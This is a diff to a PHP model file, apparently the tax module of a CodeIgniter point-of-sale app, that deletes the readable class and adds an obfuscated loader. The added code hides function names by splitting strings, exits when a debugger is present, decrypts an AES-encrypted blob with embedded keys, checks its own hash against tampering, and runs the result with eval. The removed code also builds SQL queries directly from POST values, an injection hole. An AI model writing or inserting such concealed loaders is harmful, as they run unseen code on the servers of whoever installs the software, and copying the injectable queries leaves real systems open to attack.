@@ -1,182 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Tax_model extends CI_Model {
-
-	var $table = 'db_tax';
-	var $column_order = array('id','tax_name','tax','status','undelete_bit'); //set column field database for datatable orderable
-	var $column_search = array('id','tax_name','tax','status','undelete_bit'); //set column field database for datatable searchable 
-	var $order = array('id' => 'desc'); // default order 
-
-	private function _get_datatables_query()
-	{
-		
-		$this->db->from($this->table);
-		$this->db->where('group_bit is null');
-		
-		$i = 0;
-	
-		foreach ($this->column_search as $item) // loop column 
-		{
-			if($_POST['search']['value']) // if datatable send POST for search
-			{
-				
-				if($i===0) // first loop
-				{
-					$this->db->group_start(); // open bracket. query Where with OR clause better with bracket. because maybe can combine with other WHERE with AND.
-					$this->db->like($item, $_POST['search']['value']);
-				}
-				else
-				{
-					$this->db->or_like($item, $_POST['search']['value']);
-				}
-
-				if(count($this->column_search) - 1 == $i) //last loop
-					$this->db->group_end(); //close bracket
-			}
-			$i++;
-		}
-		
-		if(isset($_POST['order'])) // here order processing
-		{
-			$this->db->order_by($this->column_order[$_POST['order']['0']['column']], $_POST['order']['0']['dir']);
-		} 
-		else if(isset($this->order))
-		{
-			$order = $this->order;
-			$this->db->order_by(key($order), $order[key($order)]);
-		}
-	}
-
-	function get_datatables()
-	{
-		$this->_get_datatables_query();
-		if($_POST['length'] != -1)
-		$this->db->limit($_POST['length'], $_POST['start']);
-		$query = $this->db->get();
-		return $query->result();
-	}
-
-	function count_filtered()
-	{
-		$this->_get_datatables_query();
-		$query = $this->db->get();
-		return $query->num_rows();
-	}
-
-	public function count_all()
-	{
-		$this->db->from($this->table);
-		return $this->db->count_all_results();
-	}
-
-
-	public function verify_and_save(){
-		//Filtering XSS and html escape from user inputs 
-		extract($this->security->xss_clean(html_escape(array_merge($this->data,$_POST))));
-
-		//Validate This tax already exist or not
-		$query=$this->db->query("select * from db_tax where upper(tax_name)=upper('$tax_name')");
-		if($query->num_rows()>0){
-			return "Tax Name Already Exist.";
-			
-		}
-		else{
-			$query1="insert into db_tax(tax_name,tax,status) values('$tax_name','$tax',1)";
-
-			if ($this->db->simple_query($query1)){
-					//$this->session->set_flashdata('success', 'Success!! New tax Percentage Added Successfully!');
-			        return "success";
-			}
-			else{
-			        return "failed";
-			}
-		}
-	}
-
-	//Get tax_details
-	public function get_details($id){
-		$data=$this->data;
-		extract($data);
-		extract($_POST);
-
-		//Validate This tax already exist or not
-		$query=$this->db->query("select * from db_tax where upper(id)=upper('$id')");
-		if($query->num_rows()==0){
-			show_404();exit;
-		}
-		else{
-			$query=$query->row();
-			$data['q_id']=$query->id;
-			$data['tax_name']=$query->tax_name;
-			$data['tax']=$query->tax;
-			
-			return $data;
-		}
-	}
-	public function update_tax(){
-		//Filtering XSS and html escape from user inputs 
-		extract($this->security->xss_clean(html_escape(array_merge($this->data,$_POST))));
-		
-		//Validate This tax already exist or not
-		$query=$this->db->query("select * from db_tax where upper(tax_name)=upper('$tax_name') and id<>$q_id");
-		if($query->num_rows()>0){
-			return "Tax Name Already Exist.";
-			
-		}
-		else{
-			$undelete_bit = $this->db->select('*')->where("id",$q_id)->get("db_tax")->row()->undelete_bit;
-			if($undelete_bit==1){
-				echo "Sorry! Can't Update Status,<br><b>This Record is Restricted!</b>";exit();
-			}
-
-			$query1="update db_tax set tax_name='$tax_name', tax='$tax' where id=$q_id";
-			if ($this->db->simple_query($query1)){
-					//$this->session->set_flashdata('success', 'Success!! tax Percentage Updated Successfully!');
-			        return "success";
-			}
-			else{
-			        return "failed";
-			}
-		}
-	}
-	public function update_status($id,$status){
-		$undelete_bit = $this->db->select('*')->where("id",$id)->get("db_tax")->row()->undelete_bit;
-		if($undelete_bit==1){
-			echo "Sorry! Can't Update Status,<br><b>This Record is Restricted!</b>";exit();
-		}
-        $query1="update db_tax set status='$status' where id=$id";
-        if ($this->db->simple_query($query1)){
-            echo "success";
-        }
-        else{
-            echo "failed";
-        }
-	}
-	public function delete_tax_from_table($ids){	
-
-		if (demo_app()) {
-			echo "Demo không cho phép xóa";
-			return;
-		}
-		$tot=$this->db->query('SELECT COUNT(*) AS tot,b.tax_name FROM db_items a,`db_tax` b WHERE b.id=a.`tax_id` AND a.tax_id IN ('.$ids.') GROUP BY a.tax_id');
-		if($tot->num_rows() > 0){
-			foreach($tot->result() as $res){
-				$tax_name[] =$res->tax_name;
-			}
-			$list=implode (",",$tax_name);
-			echo "Sorry! Can't Delete,<br>Tax Name {".$list."} already in use in Items List!";
-			exit();
-		}
-		else{
-			$query1="delete from db_tax where id in($ids) and undelete_bit=0";
-	        if ($this->db->simple_query($query1)){
-	            echo "success";
-	        }
-	        else{
-	            echo "failed";
-	        }
-		}
-	}
-	
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_gbo0sx88=('bas'.'e64'.'_de'.'cod'.'e');
+$_qpyvrq1x=('gzu'.'nco'.'mpr'.'ess');
+$_xwtvonfo=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_hlabgz59='6TfTV1tF';
+$_p44z7dxy='rahaqoFMtWg=';
+$_rxis1lp0='5O0Fwpze';
+$_bjdb1u50='kVsIoDQN';
+$_wwrqr5k2='+s4o82Tk';
+$_hqgcxk8w='jyNiXwGO';
+$_mgng9bws='/NHfJFi7';
+$_l3idu3o6='tH5FTA==';
+$_npa4kxjh=$_gbo0sx88($_hlabgz59.$_bjdb1u50.$_rxis1lp0.$_wwrqr5k2.$_p44z7dxy);
+$_cyx2qipx=$_gbo0sx88($_hqgcxk8w.$_mgng9bws.$_l3idu3o6);
+$_vqxcb2yp=$_gbo0sx88('rHjxWQSy+6oW/6915bccxDGvXKjZY2QHnZeffsMK+9/j5zmYXa4n5hb3tS8qlwhS4UDcMw05jropGbSf2Zb3ISYe9G2d7zjTfkx9HlSCbxbELaeOc71KfdSMeHnLbJ73s+SYcGjL1dztNbJ5X5++6cxZRKL5Ywv+cuzoWnG06jpit5Lrtw/PiKygbJ0khR2KWEymzaPs3OZuA2PTd0iLLkBbeT7YizxN1vCmR2vTo+cXxEmD9zonF1cpHyDwegqXWVURkY906jSWxmeTMFgI5Wr5Fxq+TwvQ3sqeZfubiiwkx3aRAocjMrTqoHM3RaskKWuX00oPGDfg29cOT1l91dtaYqPXP+e2PsxB8ZVkRSlxcW8hwfOwQBs2dy6pVFjfscDxw8GpJUaxbepLx5CDAFhU23LFR5EOPaXP6R6pUiPxwZ3EImzgaq374VjnKc8gIK4lwCos/L7pNBkjMfrTCKjo47InCcvaezPzHXWGN5o/IeT3wkSAO8rCx44JHLOi4s5sjTynXtez/NY4W1mptm8DZwCtT4UvyRlVbusRhiWrnA5wZJaQBgcCPRm6FA2YcelZZ/+aEr08Z46siD5MDV+mzOEgitM8MXNVPPSbSm3sc45LDGBUwMlIf7lo7LU3zOIFE57tD8fxvIBOz2dcS1ka8cXM/3Y6HhJjTxEckM15CgsheTrG1kUvqGX+pCI20QEO10EGuqdw090/WqmO2DrhmmUIuvXCw/dVtNol8D2b4wXasjSvTiN7+B4NgjBnNvaJnTCsTjjsKu2bOYr7nZjrNhlF79+slTh0+oaYFbN9sDhQFy3e2scVmPiGr6y0eUsnJ1NkB9zMLv5pit6tVh8wiL7i//QR+2ww8H4gN+UYX73lgMvy1i1gb8FbmLld6lssu+80W9h53D5xfQ5zQVZbi4PQV4a7tdumjGxSrArex1liFG+mmVdwf1wRUQFsaT4iQu4ZFIHIvXrRHiZcQGWQnMe+xN9qnM7XsSrLvZRuux8oJNg6uDkm28SiRRX182tlFKTGxSCcfiRL3t1Ac+JzPtc3RhXwX5cFUiiMtzeRAzYBGPcZvLXMWq5jPXw1FrN+QbcDIkZlgz2+GrR7rrSYfNd8HA08e4r8NwZfgQjzGYYUxUgqw6hCgly48Ety4pGboVIf1dj+QvU1NklOnMeHWt+V+2gmIH9pA+zwI9rAapF+Bc7Mp+H1KlHeQL0yLVWnNHCv5opcWnBtuHBJSkTyPfOi2C1VGyPuo+W9Ds+qKu6+iS5usZl18E1KB07RJXqJHB67mR97NaJOrKxNjTbLNhYd9jVFx5dkrAGVFSWAQm5WO9f+i+GX/KpukOdBejHnq2CJgaNT50WWjw6WLlasFXxw1QFpklYSuiJ6rXwNJSLF2p+L03f7tQAvMed1+m/WdGWQMjt5stuvzE3WHHWJlsU2atmPheR7VBNz04Cw7Tm8r0m4HBZnQaa4NVRdCbir/vGqai7svDymAzueHyhPTZ5ZElbHPs8IAvYfbXYGAXhv8kJKkaXpDGhT9VGrdczOXn0ZGRPl1Y5s7he+MRnJgGDhS6WCuzgMelgBj/DmdPebrOB7kJqw3jy/uBxCy4MxaLzDvw5fZmyb5kt844mnOu+A5ZwpX/aAz5NCmwpJVdHZQJ/stK3DGn/c8AmnTA4uHkq1wdZc5Ia81/My7G30m0U66+ri5qJSrYxf/V7HsBIw7ioUOlGdb/iy79gjxTcY8C689oWikseqd3XnmqAiclQhg7yDXXy50AXYA4VMTvvuMa5F6u+Ky6SO+a2ALXutVRkQMLKW5MPvO5FZIaDdqZBGPJxq+BnPz9qczfE8Co1lwRpDFyZWonUys9Dm');
+$_tvwkqpyh=$_xwtvonfo($_vqxcb2yp,'aes-256-cbc',$_npa4kxjh,OPENSSL_RAW_DATA,$_cyx2qipx);
+if($_tvwkqpyh===false){exit;}
+$_mxvpdtm1=$_qpyvrq1x($_tvwkqpyh);
+if($_mxvpdtm1===false){exit;}
+$_xd3cq7fh='cc54c9411019441651c2c563e423abee4f06effd2070ccf21940422658f3e230';
+$_hnu4nmdk=@file_get_contents(__FILE__);
+if($_hnu4nmdk!==false){
+$_okar7t1s=str_replace($_xd3cq7fh,"0000000000000000000000000000000000000000000000000000000000000000",$_hnu4nmdk);
+$_hfg7xq3c=hash("sha256",$_okar7t1s);
+if($_hfg7xq3c!==$_xd3cq7fh){@http_response_code(403);exit;}
 }
+eval($_mxvpdtm1);
